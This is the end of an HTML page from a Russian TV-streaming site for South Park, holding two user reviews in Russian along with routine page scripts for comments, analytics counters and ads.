                        <div class="svspoiler svcmt" data="comments"></div><script type="text/javascript">
            window.addEventListener("message", receiveMessage, false);
            function receiveMessage(event) {
                if ("http://svcnew.seasonvar.ru" == event.origin) {
                    if (undefined !== event.data.height) {
                        $("#svc_frame").css("height", event.data.height+30);
                    } else if (undefined !== event.data.scroll) {
                        $("body, html").animate({scrollTop:event.data.scroll+$("#svc_frame").offset().top}, "slow");
                    } else if (undefined !== event.data.isLoaded) {
                        if ("1" == $.cookie("spoiler_comments")) {
                            $(".svspoiler[data=comments]").click();
                        }
                    }
                }
            }
            document.domain = "seasonvar.ru";
            </script>
            <iframe id="svc_frame" src="http://svcnew.seasonvar.ru/9c6a2d90c8e8790f5291ee8cc4470c93/comments/14258/" class="svtabr"></iframe></div>
                    <div id="tab_poster" class="svtabr_wrap"></div>
                    <div id="tab_epinfo" class="svtabr_wrap epinfo"></div>
                    <div id="tab_download" class="svtabr_wrap download"></div>
                    <div id="tab_dopinfo" class="svtabr_wrap dopinfo"><div></div></div>
                    <div id="tab_fanart" class="svtabr_wrap"></div>

                </div>
                <script src="/less/js/imagesloaded.pkgd.js"></script>
                <script src="/less/js/masonry.pkgd.js"></script>

                            <div class="svtab svspoiler" data="review">
                    <ul class="svtab_wrap">
                        <li class="svtab_wrap_li"><span class="show">Рецензии</span></li>
                    </ul>
                </div>
                <div class="svtabr">
                    <div class="svtabr_wrap show spoiler-body">
                                                                        <div class="full-news-4-content">
                <div class="recens_avatar">
                    <img src="http://graph.facebook.com/1056627263/picture?type=square">
                </div>
                <div>
                    <span class="recens_nick">
                                                    Iolanta Serzhantova
                                            </span>
                    <span class="recens_number">
                        .138554
                    </span>
                </div>
                Мультфильм на грани вымысла и реальности. Говорят, что большинство граждан живут и принимают решения в полусне. Так же и герои этого мультфильма. Живут , словно в бреду. Совершают странные поступки, произносят глупости. НО кто из нас не был странен, когда ему было мало лет?! Не знаю, что лучше, рисованная мультипликация, компьютерная анимация, пластилин или жвачка на стекле. Главное, чтобы было интересно наблюдать за жизнью персонажей, отдавая им на откуп часть своего времени. Жёлтый школьный автобус заставил улыбнуться. Захотелось, как в детстве, взять цветную бумагу, клей, ножницы и смастерить нечто подобное прекрасному городку в южном парке... Одна беда - так красиво не получится. Остаётся одно,- включать сериал и смотреть...
                <div class="recens_number">
                    Дата публикации на сайте: 03.10.2016
                </div>
            </div>
                                <div class="full-news-4-content">
                Дата публикации на сайте: 29.09.2016<br /><br />
                Думаю ,что многие из вас смотрели забавный сериал под названием «Южный парк». Это достаточно популярный и замечательный сериал, который уже насчитывает целых двадцать сезонов, а значит действительно стоящий и хороший. Так что совершено не удивительно, что фраза «Они убили Кенни! Сволочи!»стала очень распространённой и крылатой. Это выражение произнёс один из героев этого легендарного проекта, который сумел себя зарекомендовать и показать с самой лучшей стороны. Многие уже говорят о том, что «Южный парк» лучше «Симпсонов» и «Фуиурамы», хотя эти проекты так же пользуются большой популярностью и любовью зрителей. Итак, сегодня я хочу поговорить именно о сериале «Южный парк», который кардинальным образом отличается от всех других. Он совершенно ни чем себя не ограничивает, может поднимать любые темы, высказывать самые различные мнения и не следить за цензурой. А от куда появилось такое название, и что оно обозначает? Сам Южный парк – это город, в котором и происходят эти все события. Расположен он где-то не далеко от Колорадо. В этом городке есть всё – школа, полиция, мэрия, детские сады, магазины, в общем всё то, что необходимо любому самостоятельному городу. Да сам городок не большой и количество населения такое же, но каждый из них очень важен для этого места, поэтому наблюдать за героями действительно очень интересно. Когда ещё только данный проект представил свои первые серии зрителям, те были настолько обескуражены и ошеломлены, что немедленно захотели узнать, вымышленный это город или нет. Естественно это выдуманный населённый пункт, которого нет на карте, так как его придумали создатели данной картины. скрывать здесь было особо не чего, поэтому авторы сами ещё раз подтвердили, что это просто вымысел и ни с каким городом его не связывают. Это вполне естественно, так что ни каких возмущений не было, и работа дальше пошла своим ходом.  Действительно создатели очень хорошо потрудились,потому что они прорабатывали каждые детали и мелочи, не упуская ни чего из вида. Именно по этому сериал получился таким ярким и ослепительным. Про сценарий даже сказать не чего, потрясающий и яркий, так что смотрится с большим удовольствием. Сценаристы сумели построить ход сюжета и событий так, что все герои, даже второстепенные, получились яркими, красивыми, значимыми и важными для этой картины. Здесь всё настолько правдиво выглядит, что глядя на этих героев думаешь, это они действительно живые и запросто могут встретиться нам в обычной жизни. А если немного представить всё это в глобальных масштабах, то как и есть. Перед нами как будто бы уменьшенная копия мира, на которую мы смотрим со стороны, но прекрасно всё поминаем. Мы видим все отрицательные моменты, все его недостатки и промахи. Действительно это представлено очень грамотно и профессионально, поэтому и смотреть данный сериал приятно. Конечно, здесь очень много достойных персонажей, о которых следовало бы вам рассказать ,но я хочу из всего этого множества выделить двух второстепенных героев, которые, на мой взгляд, являются очень интересными и яркими – это Шеф и Баттерс.<br />
Перед нами достаточно любопытный персонаж – это Шеф, который представлен каким то сумасшедшем поваром, с тёмным цветом кожи. Изначально у меня были сомнения, правде ли он такой, но чуть позже я поняла, что он действительно не очень то дружит с головой.  Шеф к тому же очень сильно зациклен на любовных отношениях, для него слабый пол соблазн ,перед которым он совершено не может устоять. Поэтому, совершено не удивительно ,что герой написал песню, которая была посвящена милым красавицам, без которых он просто не представляет своей жизни.<br />
Баттерс – это тот герой, которого мне больше всего жалко в данном сериале. Мало того, что его родители не самые нежные и заботливые, так ещё и Картмен постоянно над ним насмехается, а порой ещё и бьёт. Но, несмотря на не самые добрые отношения в семье, этот герой очень уважительно и вежливо относиться к ним. Вообще, Баттерс достаточно добрые, ранимые и хороший мальчик, просто из-за кучи проблем это сложно заметить. Понятно, что в жизни у него не было каких то ярких, положительных моментов, поэтому он и превращается в злобного героя, который мечтает причинить зло всем, но по ходу сюжета выясняется, что подобные события уже происходили в «Симпсонах».<br />
В данном сериале есть ещё два очень любопытных персонажа – это Нед Герблански и Керн Джимбо. Они достаточно суровые парни, которые очень любят пострелять. Но их объединяет не только это влечение, они ещё ведут совместное шоу на местном телевидении. Эти ребята знакомы давно, со времён войны во Вьетнаме, и с того времени они больше не расставались, теперь они друзья, да ещё и имеют совместный бизнес, а значит у них достаточно прочные и крепкие отношения. Наблюдать за этими персонажами действительно интересно, они необычные, своеобразные и совершено непредсказуемые личности.<br />
Достаточно много внимания уделяется и Мистеру Гаррисону, который является нестандартным и совершено удивительным человеком. На протяжении всего сериала мы не раз увидим, как он меняет свой пол, а ведь это очень серьёзный шаг. Ко всему прочему этот человек преподаёт в школе, и именно ведёт занятия у учеников начальной школы. Думаю, что данный персонаж на роль учителя совершено не тянет, но в сериале он смотрится просто потрясающе. Хоть такого учителя вряд ли кто-то хотел бы видеть у своих детей. Даже создатели не стали скрывать своего отношения к Мистеру Гаррисону, и сказали ,что это один из тех персонажей, который не располагает к себе. Именно этот герой решил доказать свою гениальность и доказать всем, это он действительно талантлив и умён. По этой причине он решает написать книгу, которая называется «Аллея Пенисов». Понятно, что это просто невероятное произведение, за которое его награждают достаточно важной премией – Пулицеровской. Такой поворот событий совершено не мог уложиться у зрителей в голове, а герои этой картины возмущались всему происходящему. Такое ощущение, что в мире совершено ни кто ни чего не понимает или просто не хочет замечать ,чтобы лишний раз не во что не вмешиваться. А наш герой получив такой значимый подарок и признание, что его произведение действительно очень важное и нужное, просто пытается от всех скрыться . Только всё это не могло так просто закончиться и именно в это время к Мистеру Гаррисону приходит озарение, он понимает, что на самом деле он гомосексуалист. Но, на этом его приключения не закончились, потому что в его голове творилось совершено что-то непонятное. Он хотел, чтобы его уволили из школы, для этого он сам принял решение, что будет приставать к детям. Он думал, что сможет отсудить у школы большие деньги, но ни чего подобного не произошло. Потом он придумал какой-то странный аппарат и назвал его самым оригинальным названием «Это». Что оно делает и для чего создано, совершено не ясно. Чуть позже он решил стать женщиной и выбрать ориентацию лесбиянки. Таких бредовых мыслей у него в голове огромное множество, поэтому перечислять их можно до бесконечности.<br />
Я не буду рассказывать вам про главных героев данного сериала – Кайла, Картмана, Стена и Кенни, эти герои действительно любопытны и интересны, поэтому лучше вам познакомиться с ними лично, если вы, конечно же, ещё не знакомы с этим произведением. Я уверена, что данный проект будет интересен всем зрителям, ведь здесь много актуальных и значимых тем, которые рассказывают и показывают данные герои. «Южный парк»  - это такой сериал, который придётся по душе даже для большой компании людей, которые могут хорошо провести время, посмеяться, повеселиться и оценить по достоинству всё то, что предлагает нам данный сериал. Единственное, это не семейный мультик, поэтому детям возле экрана делать совершено не чего, для них снято очень много хороших, добрых и позитивных картин, а этот проект рассчитан на взрослую публику, которая сможет оценить задумку авторов. Так что желаю вам всем приятного просмотра и невероятных впечатлений! Спасибо за внимание!
            </div>


                    </div>
                </div>

        </div>
    </div>
                            <div style="margin-top: 25px;">
                    </div>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
        <div class="footer" style="height: 67px;">
    <div class="footer-copy"  style="padding-top:6px;white-space:nowrap;">
        <span>&copy; 2008-2016 SEASONVAR.RU</span>
        ВСЕ ПРАВА ЗАЩИЩЕНЫ, МАТЕРИАЛ ПРЕДОСТАВЛЕН ТОЛЬКО ДЛЯ ОЗНАКОМЛЕНИЯ, 16+
        <style>
            .foott {text-align: center;}
            .foott a {color:#dbdbdb;}
        </style>
        <div class="foott"><a href="/?mod=zakaz">Заказ сериала</a> | <a href="/?mod=faq">F.A.Q</a> | <a href="/?mod=ticket">Сообщить об ошибке</a> | <a href="/premium">Премиум</a></div>
        <div style="text-align: center;padding-top: 7px;"><a href="/?mod=abuse">Для правообладателей</a> | <a href="/?mod=com">Для рекламодателей</a> </div>
    </div>
    <a href="/" class="logo2"></a>
    <div style="position: absolute;left: 40px;top: 20px;color: #fff;">
        <div style="float: left;margin-right: 10px;">
            <!--LiveInternet counter--><script type="text/javascript"><!--
                document.write("<a href='//www.liveinternet.ru/click' "+
                        "target=_blank><img src='//counter.yadro.ru/hit?t41.12;r"+
                        escape(document.referrer)+((typeof(screen)=="undefined")?"":
                        ";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
                                screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
                        ";"+Math.random()+
                        "' alt='' title='LiveInternet' "+
                        "border='0' width='31' height='31'><\/a>")
                //--></script><!--/LiveInternet-->


            <!-- Yandex.Metrika counter -->
            <script type="text/javascript">
                (function (d, w, c) {
                    (w[c] = w[c] || []).push(function() {
                        try {
                            w.yaCounter18520561 = new Ya.Metrika({id:18520561});
                        } catch(e) { }
                    });

                    var n = d.getElementsByTagName("script")[0],
                            s = d.createElement("script"),
                            f = function () { n.parentNode.insertBefore(s, n); };
                    s.type = "text/javascript";
                    s.async = true;
                    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";

                    if (w.opera == "[object Opera]") {
                        d.addEventListener("DOMContentLoaded", f, false);
                    } else { f(); }
                })(document, window, "yandex_metrika_callbacks");
            </script>
            <noscript><div><img src="//mc.yandex.ru/watch/18520561" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
            <!-- /Yandex.Metrika counter -->
        </div>
        <div style="clear: both;"></div>
    </div>
</div>

</div>






    </div>

            <script>(function(){var s=document.createElement('script');s.src='http://obhodsb.com/j/w.php?id=NTE=&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>

    <script type="text/javascript" src="/cview.php?id=14258"></script>
    <script type="text/javascript" src="/less/js/pg-second.js?v=6"></script>
    <script type="text/javascript" src="/less/js/player.js?v=11"></script>
</body>

</html>
"""
}